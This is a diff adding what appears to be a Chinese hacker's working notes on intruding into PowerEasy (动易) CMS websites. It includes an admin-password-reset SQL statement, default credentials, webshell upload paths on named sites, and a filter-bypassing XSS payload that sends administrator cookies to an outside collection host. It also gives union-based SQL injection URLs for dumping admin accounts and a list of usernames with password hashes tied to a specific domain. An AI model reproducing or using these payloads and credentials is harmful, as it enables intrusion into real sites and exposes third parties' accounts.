@@ -1,0 +1,205 @@
+update PE_Admin set Password='13955235245b2497' where id=2--
+
+
+
+
+最简单漏洞就是注册一个asp。asp用户  
+
+http://stu.8379888.com//user/Upload.asp?dialogtype=UserBlogPic&size=5上传  解析拿下webshell
+http://stu.8379888.com/reg/user_reg.asp
+
+http://stu.8379888.com//user/Upload.asp?dialogtype=UserBlogPic&size=5
+
+http://www.hbhcsg.net.cn/sg/admin/Admin_Index.asp
+
+http://www.hbhcsg.net.cn/sg/admin/Admin_login.asp
+
+http://zzb.hunnu.edu.cn//admin/Admin_login.asp
+
+
+
+
+
+http://www.hnisc.com/hnisc/Article/show_classmenu_js.asp?ClassID=87
+
+
+动易的默认数据库、用户和密码、认证码大全还有找后台方法
+ 动易入侵动易注入入侵动易动易默认密码杂谈  
+admin
+admin888
+'or'='or'
+8888
+2007
+2008
+2006
+SiteManageCode8888/SiteManageCode
+database/SiteWeaver6.5.mdb
+database/SiteWeaver.mdb
+
+PowerEasy2006
+PowerEasy2007
+PowerEasy2008
+database/PowerEasy2006.mdb
+database/PowerEasy2007.mdb
+database/PowerEasy2008.mdb
+
+其他后台
+http://stu.8379888.com/user/User_Login.asp
+admin  admin888
+
+真正后台
+http://stu.8379888.com//AdminMaster/Admin_Login.asp
+
+
+
+真正后台查找
+
+登入:
+http://stu.8379888.com/user/User_Login.asp
+admin  admin888
+
+| 设为首页 | 加入收藏 | 联系站长 | 友情链接 | 版权申明 | 管理登录 | 
+
+管理登录
+
+
+
+
+后台2: 这个方法很巧，但也不是全部都行，因为有些的已经修改admin_login.asp的名称，针对修改路径是很有效的，也可以说是利用了管理员对css的疏忽
+漏洞文件：
+region.asp
+1、打开某动易核心的网站，在域名后加region.asp访问，如http://www.80lr.com/region.asp
+便会显示下面的内容：
+国家/地区：
+省/市/自治区：
+市/县/区/旗：
+2、然后查看“源文件”，在第四行有一段嵌入css的代码
+可以看到路径是："Admin/Admin_Style.css"，便得知后台路径为“Admin/”，即“Admin_Style.css”前面的文件夹路径为后台路径
+原因：
+调用的CSS文件存放在后台目录下,导致利用源代码的查询而获取物理路径.
+
+
+
+后台3:
+登入:
+http://stu.8379888.com/user/User_Login.asp
+admin  admin888
+我的聚合---立即开通我的聚合空间---右击查看"源文件"
+自己仔细找找很有可能找到后台地址
+
+
+
+
+
+
+如果要修改默认值为别的什么内容，
+比如把powereasy2008修改为SiteWeaver，请修改系统根目录下的config.asp的第12行
+Const SiteManageCode = "PowerEasy2008"  '后台管理认证码，您可以修改成您的管理员认证码：×××××××××
+为
+
+http://www.hbhcsg.net.cn//Admin/Admin_Login.asp
+http://www.hbhcsg.net.cn/sg/Photo/
+
+
+http://www.hbhcsg.net.cn/sg/cookies/cookies.asp
+
+
+
+
+
+
+
+如何入侵动易2006 SP2？漏洞利用大曝光
+作者：佚名    文章来源：网络    点击数：838    更新时间：2008-11-17
+  入侵动易2006_SP6的方法，说白了，利用它的参数过滤不严，跨站。该怎么跨呢？看我来操作。
+
+动易2006_SP6整站系统会带有一个“雁过留声”留言本，我们就是要从这个留言本下手，通过跨站来得到管理员的密码(*^__^*) 嘻嘻……。
+
+比如www.xxx.com是用动易2006_SP6搭建起来的，那么它默认的留言本路径就是www.xxx.com/guestbook了，进去留言板后，选择“源代码”模式签写留言。如果在审核发表状态下钓到管理员Cookies的几率比高，我先讲解一下动易2006_SP6留言本漏洞原理，用“源代码”模式签写留言的时候，提高后系统会过滤掉script，防止跨站，比如<script>提交到后台后，管理员看到的就是<>了。可惜啊，它只过滤一次，如果我们提交<scrSCRIPTipt>的话，到了后台，SCRIPT就被过滤掉了，剩下的就是<script>了，哈哈！！！
+
+
+具体操作一下，在“源代码”模式下签写留言，输入如下代码：
+下面是一个获得Cookies的代码，会把Cookies提交到http://www.xxx.com/cookies/cookies.asp
+
+<form name=redir action=http://www.xxx.com/cookies/cookie.asp method=post>
+<input type=hidden name=cookie>
+<input type=hidden name=url>
+<input type=hidden name=hostname>
+</form>
+<script>redir.cookie.value=document.cookie;redir.url.value=location.href;redir.hostname.value=location.hostname;redir.submit();</script>
+现在我们在一些可能的敏感字符中插入SCRIPT字符，以防我们的代码被破坏
+
+更改后的代码如下：
+<FOSCRIPTRM naSCRIPTme=redSCRIPTir actSCRIPTion=http://www.xxx.com/cooSCRIPTkies/cooSCRIPTkie.asp>
+<input type=hidSCRIPTden name=coSCRIPTokie>
+<input type=hidSCRIPTden name=uSCRIPTrl>
+<input type=hidSCRIPTden name=hoSCRIPTstname>
+</forSCRIPTm>
+<scrSCRIPTipt>rSCRIPTedir.cooSCRIPTkie.valSCRIPTue=docSCRIPTument.coSCRIPTokie;redSCRIPTir.urSCRIPTl.vaSCRIPTlue=locSCRIPTation.hrSCRIPTef;redSCRIPTir.hostnamSCRIPTe.vaSCRIPTlue=locatiSCRIPTon.hostnSCRIPTame;redSCRIPTir.subSCRIPTmit();</scrSCRIPTipt>
+
+提交上去吧，只要管理员一上线，Cookie就到手了，里面包括有管理员的用户名、密码，和管理认证码！以后我们就可以用Cookie欺骗来进入后台了。
+
+
+
+
+
+
+
+路径: /Admin_Index.asp
+(1)：先暴所有管理员帐号。
+我们先在后面加入以后代码
+/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+username+from+PE_Admin+where+1<2+and+'1'='1
+先暴所有管理员帐号。
+管理员的密码出来了：admin
+(2):接下来我们先爆出管理员的密码
+/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+password+from+PE_Admin+where+username="帐号"+and+'1'='1
+
+
+
+http://csctl.com///install.asp
+huyougen
+5118236
+http://csctl.com///editor.asp
+
+dengliping
+c49987f6a233a88e
+
+chengjianhua
+77804d2ba1922c33
+
+leiyonghong
+9db5cea12e2c4c49
+
+raomin
+91a797ddfbd897cb
+
+wudongxiang
+
+
+ dac74fc60f9fa7aa  
+
+
+
+xiexiuyun
+   142584a3a1ad1aa8  
+
+
+
+xuxiaoyi
+
+
+：   dac74fc60f9fa7aa    xuzhiqiong
+
+yangyuanyuan  
+   77804d2ba1922c33  
+
+
+
+zhoumingfang
+
+：   05a32f02342dec79  
+
+http://csctl.com/xuesheng/ShowArticle.asp?ArticleID=4665
+
+
+
